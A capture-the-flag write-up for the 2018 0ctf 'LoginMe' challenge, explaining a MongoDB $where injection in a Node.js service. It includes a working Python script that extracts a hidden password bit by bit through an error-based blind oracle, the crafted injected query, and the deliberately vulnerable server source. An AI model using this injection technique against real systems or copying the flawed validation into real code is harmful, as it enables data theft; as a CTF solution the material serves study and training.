2018 0ctf quals – LoginMe
=========================

We were given a NodeJS service and source that uses MongoDB. The `check` endpont runs a mongo query, partially
controlled by us, and if the query succeeds, it responds `ok`.

The following template is used to generate a mongo `$where` JavaScript filter:

    'if(this.username == #username# && #username# == "admin" && hex_md5(#password#) == this.'+password_column+'){\nreturn 1;\n}else{\nreturn 0;}'

where the parameters were interpolated as `JSON.stringify(req.body[k])`. At first, I was considering a solution where
we abuse the `bodyParser` to return fancy objects, but then I realized there is no way I could escape the
`hex_md5(#password#)` part.

Look at the custom template code:

    for(var k in req.body){
        var valid = ['#','(',')'].every((x)=>{return req.body[k].indexOf(x) == -1});
        if(!valid) res.send('Nope');
        check_function = check_function.replace(
            new RegExp('#'+k+'#','gm')
            ,JSON.stringify(req.body[k]))
    }

Notice that `res.send('Nope');` doesn't return the function. The code continues to run, but at this point we lost our
only bit of leaked information, so we have to conform the character blacklist. Fortunately we have RegExp control
characters enabled, so we can abuse that to replace more of the template. `|` for escape the `#` markers, and `$1` to
include match groups. I ended up replacing the whole string. In the end, the query sent to mongo looked like this:

    { '$where': '"";((this.password_wblm2gvcl0p.charCodeAt(16) >>> 0) & 1) || lolwut;""' } { '$set': { last_access: '2018-04-04 19:59:15 +02:00' } }
    
When mongo returns with an error (because it could not evaluate the expression as `lolwut` is not defined), the http
connection is closed abruptly. I ended up adding some retry logic to mitigate network errors corrupting our precious
bits.

Flag: `flag{13fc892df79a86494792e14dcbef252a}`


Solution source
===============

```python3
import requests
from collections import OrderedDict

import os
import time
#os.environ["HTTP_PROXY"] = "localhost:8888"

prefix = "13fc892df79a86494792e14dcbef252a"
prefix = "---------------- 7  e   c       "

URL = "http://202.120.7.194:8082/check"
#URL = "http://localhost:8081/check"

def _test(i, c):
  try:
    resp = requests.post(URL, data=OrderedDict([
      ("|.*(.)this.*(this.password_\\w*)(.)(.|\n)*|", ";$1$1$2.charCodeAt$1{}$3 >>> {}$3 & 1$3 || lolwut;".format(i, c)),
      ("|\"|", ""),
    ]))
    return resp.text == 'ok'
  except:
    return False

def test(i, c):
  return _test(i, c) or _test(i, c)

def get_char(i):
  cc = 0
  for b in range(8):
    if test(i, b):
      cc |= 1 << b
  return cc

for i,c in enumerate(prefix):
  if c == ' ':
    print("so far: {!r}".format(prefix))
    print("         " + " "*i+"*")
    nc = get_char(i)
    if nc == 0 or nc == 255:
      raise Exception('could not find')
    prefix = prefix[:i] + chr(nc) + prefix[i+1:]
print("SOLUTION {!r}".format(prefix))
```
 

Challenge source
================

```javascript
var express = require('express')
var app = express()

var bodyParser = require('body-parser')
app.use(bodyParser.urlencoded({}));

var path    = require("path");
var moment = require('moment');
var MongoClient = require('mongodb').MongoClient;
var url = "mongodb://localhost:27017/";

MongoClient.connect(url, function(err, db) {
    if (err) throw err;
    dbo = db.db("test_db");
    var collection_name = "users";
    var password_column = "password_"+Math.random().toString(36).slice(2)
    var password = "XXXXXXXXXXXXXXXXXXXXXX";
    // flag is flag{password}
    var myobj = { "username": "admin", "last_access": moment().format('YYYY-MM-DD HH:mm:ss Z')};
    myobj[password_column] = password;
    dbo.collection(collection_name).remove({});
    dbo.collection(collection_name).update(
        { name: myobj.name },
        myobj,
        { upsert: true }
    );

    app.get('/', function (req, res) {
        res.sendFile(path.join(__dirname,'index.html'));
    })
    app.post('/check', function (req, res) {
        var check_function = 'if(this.username == #username# && #username# == "admin" && hex_md5(#password#) == this.'+password_column+'){\nreturn 1;\n}else{\nreturn 0;}';

        for(var k in req.body){
            var valid = ['#','(',')'].every((x)=>{return req.body[k].indexOf(x) == -1});
            if(!valid) res.send('Nope');
            check_function = check_function.replace(
                new RegExp('#'+k+'#','gm')
                ,JSON.stringify(req.body[k]))
        }
        var query = {"$where" : check_function};
        var newvalue = {$set : {last_access: moment().format('YYYY-MM-DD HH:mm:ss Z')}}
        dbo.collection(collection_name).updateOne(query,newvalue,function (e,r){
            if(e) throw e;
            res.send('ok');
            // ... implementing, plz dont release this.
        });
    })
    app.listen(8081)

});
```